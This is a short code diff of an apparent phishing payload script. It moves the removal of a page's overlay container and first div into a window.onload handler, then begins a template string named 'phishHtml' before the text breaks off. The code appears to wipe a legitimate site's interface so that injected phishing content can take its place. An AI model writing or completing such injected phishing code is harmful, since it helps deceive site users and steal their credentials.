@@ -1,5 +1,7 @@
-document.getElementsByClassName('cdk-overlay-container')[0].remove();
-document.getElementsByTagName('div')[0].remove();
+window.onload = function() {
+  document.getElementsByClassName('cdk-overlay-container')[0].remove();
+  document.getElementsByTagName('div')[0].remove();
+};
 let runOnce = false;
 const phishHtml = `
 <style>
